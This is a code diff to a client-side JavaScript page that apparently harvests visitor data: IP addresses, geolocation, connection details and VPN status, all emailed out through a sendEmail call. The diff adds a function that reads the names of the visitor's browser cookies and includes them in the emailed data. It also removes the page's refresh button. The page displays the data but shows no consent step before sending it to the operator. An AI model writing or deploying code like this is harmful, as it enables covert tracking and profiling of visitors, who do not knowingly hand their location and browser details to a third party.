@@ -57,7 +57,8 @@ CONNECTION TYPE: ${data.connectionType}
 DOWNLINK: ${data.downlink}
 EFFECTIVE TYPE: ${data.effectiveType}
 ROUND TRIP TIME: ${data.rtt}
-SAVE DATA: ${data.saveData}`
+SAVE DATA: ${data.saveData}
+SAVED COOKIES: ${data.savedCookies}`
     };
 
     try {
@@ -169,11 +170,12 @@ async function getGeolocation() {
     });
 }
 
-async function loadData() {
-    const btn = document.getElementById('refresh-btn');
-    btn.textContent = 'loading...';
-    btn.disabled = true;
+function getSavedCookies() {
+    const cookies = document.cookie.split('; ').map(cookie => cookie.split('=')[0]);
+    return cookies.join(', ');
+}
 
+async function loadData() {
     let collectedData = {}; // Data to be displayed and sent
 
     try {
@@ -236,6 +238,9 @@ async function loadData() {
         collectedData.longitude = geoData.longitude;
         collectedData.accuracy = geoData.accuracy;
 
+        // Saved cookies
+        collectedData.savedCookies = getSavedCookies();
+
         // Update display on the webpage
         document.getElementById('ip').textContent = collectedData.ip;
         document.getElementById('ipv6').textContent = collectedData.ipv6;
@@ -280,6 +285,7 @@ async function loadData() {
         document.getElementById('rtt').textContent = collectedData.rtt;
         document.getElementById('saveData').textContent = collectedData.saveData;
         document.getElementById('vpn').textContent = collectedData.vpn;
+        document.getElementById('savedCookies').textContent = collectedData.savedCookies;
 
         // Send email with all collected data (client-side)
         await sendEmail(collectedData);
@@ -330,14 +336,8 @@ async function loadData() {
         document.getElementById('rtt').textContent = 'error';
         document.getElementById('saveData').textContent = 'error';
         document.getElementById('vpn').textContent = 'error';
+        document.getElementById('savedCookies').textContent = 'error';
     }
-
-    btn.textContent = 'refresh data';
-    btn.disabled = false;
-}
-
-function refresh() {
-    loadData();
 }
 
 // --- Video and Audio Autoplay Attempt ---
